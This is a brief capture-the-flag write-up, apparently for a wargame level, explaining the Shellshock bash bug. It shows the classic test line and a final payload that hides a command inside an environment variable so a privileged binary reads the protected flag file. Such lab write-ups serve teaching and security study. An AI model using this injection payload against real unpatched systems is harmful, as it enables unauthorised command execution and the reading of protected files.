
home folder has multiple files 
- shellshock.c
- shellshock
- bash
- flag

this means, that we have to use local folder `bash`

original shellshock looked like this

```bash 
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
where   
- `env x='() { :;};` is a command to set enviroment variable
- `echo vulnerable'` is arbitrary command that will be executed by bash (in our case we can use ./bash)
- `bash -c "echo this is a test"` is a real command

so our final payload will be

```Bash
env x='() { :;}; ./bash -c "cat flag"' ./shellshock
```
